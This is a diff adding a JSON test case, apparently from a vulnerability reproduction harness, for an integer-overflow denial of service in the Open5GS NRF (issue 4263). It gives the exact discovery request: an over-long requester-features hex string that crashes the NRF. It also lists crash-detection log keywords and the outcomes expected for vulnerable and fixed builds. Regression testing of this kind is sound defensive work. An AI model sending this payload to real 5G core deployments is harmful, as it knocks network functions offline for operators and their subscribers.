@@ -1,0 +1,50 @@
+{
+  "schema_version": 1,
+  "id": "open5gs_4263_nrf_requester_features_overflow",
+  "title": "NRF requester-features integer overflow DoS",
+  "component": "nrf",
+  "protocol": "SBI",
+  "issue": "https://github.com/open5gs/open5gs/issues/4263",
+  "fix": "https://github.com/open5gs/open5gs/pull/4333",
+  "transport": {
+    "scheme": "http",
+    "http2_prior_knowledge": true,
+    "sender_container": "amf"
+  },
+  "target": {
+    "container": "nrf",
+    "host": "nrf",
+    "port": 7777,
+    "method": "GET",
+    "path": "/nnrf-disc/v1/nf-instances"
+  },
+  "query": {
+    "target-nf-type": "BSF",
+    "requester-nf-type": "AMF",
+    "target-plmn-list": "[{\"mcc\":\"123\",\"mnc\":\"456\"}]",
+    "requester-plmn-list": "[{\"mcc\":\"999\",\"mnc\":\"70\"}]",
+    "requester-features": "ffffffffffffffffffffffffffffffffffffffff"
+  },
+  "detection": {
+    "fatal_keywords": [
+      "FATAL",
+      "abort",
+      "assert",
+      "Numerical result out of range",
+      "ogs_uint64_from_string",
+      "SIGABRT"
+    ]
+  },
+  "expect": {
+    "vulnerable": [
+      "nrf_crash",
+      "nrf_restart",
+      "fatal_log"
+    ],
+    "fixed_or_safe": [
+      "http_error",
+      "safe_reject",
+      "nrf_alive"
+    ]
+  }
+}
